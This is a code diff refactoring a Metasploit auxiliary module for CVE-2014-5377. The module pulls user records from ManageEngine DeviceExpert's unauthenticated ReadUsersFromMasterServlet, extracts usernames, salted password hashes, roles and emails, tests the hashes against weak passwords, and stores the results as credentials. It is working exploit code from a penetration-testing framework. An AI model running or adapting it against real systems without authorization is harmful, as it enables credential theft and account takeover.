@@ -29,9 +29,9 @@ class Metasploit3 < Msf::Auxiliary
         ],
       'References'     =>
         [
-          ['EDB'       => '34449'],
-          ['OSVBD'     => '110522'],
-          ['CVE'       => '2014-5377']
+          ['EDB', '34449'],
+          ['OSVBD', '110522'],
+          ['CVE', '2014-5377']
         ],
       'DisclosureDate' => 'Aug 28 2014'))
     register_options(
@@ -48,17 +48,17 @@ class Metasploit3 < Msf::Auxiliary
 
   def get_users
     users = nil
-    vprint_status "#{peer} - Reading users from master..."
-    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'ReadUsersFromMasterServlet')
+    vprint_status("#{peer} - Reading users from master...")
+    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'ReadUsersFromMasterServlet'))
     if !res
-      vprint_error "#{peer} - Connection failed"
+      vprint_error("#{peer} - Connection failed")
     elsif res.code == 404
-      vprint_error "#{peer} - Could not find 'ReadUsersFromMasterServlet'"
+      vprint_error("#{peer} - Could not find 'ReadUsersFromMasterServlet'")
     elsif res.code == 200 && res.body =~ /<discoverydata>(.+)<\/discoverydata>/
       users = res.body.scan(/<discoverydata>(.*?)<\/discoverydata>/)
-      vprint_good "#{peer} - Found #{users.length} users"
+      vprint_good("#{peer} - Found #{users.length} users")
     else
-      vprint_error "#{peer} - Could not find any users"
+      vprint_error("#{peer} - Could not find any users")
     end
     users
   end
@@ -68,45 +68,92 @@ class Metasploit3 < Msf::Auxiliary
     username = user.scan(/<username>([^<]+)</).flatten.first
     encoded_hash = user.scan(/<password>([^<]+)</).flatten.first
     role = user.scan(/<userrole>([^<]+)</).flatten.first
-    email = user.scan(/<emailid>([^<]+)</).flatten.first
+    mail = user.scan(/<emailid>([^<]+)</).flatten.first
     salt = user.scan(/<saltvalue>([^<]+)</).flatten.first
     hash = Rex::Text.decode_base64(encoded_hash).unpack('H*').flatten.first
+    pass = nil
     ['12345', 'admin', 'password', username].each do |weak_password|
       if hash == Rex::Text.md5(weak_password + salt)
-        print_status "#{peer} - Found weak credentials (#{username}:#{weak_password})"
+        pass = weak_password
         break
       end
     end
-    [username, hash, role, email, salt]
+    [username, pass, hash, role, mail, salt]
   end
 
-  def run
+  def run_host(ip)
     users = get_users
     return if users.nil?
+
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: (ssl ? 'https' : 'http'),
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
     cred_table = Rex::Ui::Text::Table.new(
       'Header'  => 'ManageEngine DeviceExpert User Credentials',
       'Indent'  => 1,
-      'Columns' => ['Username', 'Password Hash', 'Role', 'E-mail', 'Password Salt']
+      'Columns' =>
+        [
+          'Username',
+          'Password',
+          'Password Hash',
+          'Role',
+          'E-mail',
+          'Password Salt'
+        ]
     )
-    vprint_status "#{peer} - Parsing user data..."
+
+    vprint_status("#{peer} - Parsing user data...")
     users.each do |user|
-      record = parse_user_data user.to_s
-      unless record.join.empty?
-        report_auth_info(
-          'host'  => rhost,
-          'port'  => rport,
-          'sname' => (ssl ? 'https' : 'http'),
-          'user'  => record[0],
-          'pass'  => record[1],
-          'type'  => 'hash',
-          'proof' => "salt: #{record[4]} role: #{record[2]} email: #{record[3]}",
-          'source_type' => 'vuln'
-        )
-        cred_table << [record[0], record[1], record[2], record[3], record[4]]
+      record = parse_user_data(user.to_s)
+      next if record.join.empty?
+
+      user = record[0]
+      pass = record[1]
+      hash = record[2]
+      role = record[3]
+      mail = record[4]
+      salt = record[5]
+
+      cred_table << [user, pass, hash, role, mail, salt]
+
+      if pass
+        print_status("#{peer} - Found weak credentials (#{user}:#{pass})")
+        credential_data = {
+          origin_type: :service,
+          module_fullname: self.fullname,
+          private_type: :password,
+          private_data: pass,
+          username: user
+        }
+      else
+        credential_data = {
+          origin_type: :service,
+          module_fullname: self.fullname,
+          private_type: :nonreplayable_hash,
+          private_data: "#{salt}:#{hash}",
+          username: user
+        }
       end
+
+      credential_data.merge!(service_data)
+      credential_core = create_credential(credential_data)
+      login_data = {
+        core: credential_core,
+        access_level: role,
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }
+      login_data.merge!(service_data)
+      create_credential_login(login_data)
+
     end
+
     print_line
-    print_line "#{cred_table}"
+    print_line("#{cred_table}")
     loot_name     = 'manageengine.deviceexpert.user.creds'
     loot_type     = 'text/csv'
     loot_filename = 'manageengine_deviceexpert_user_creds.csv'
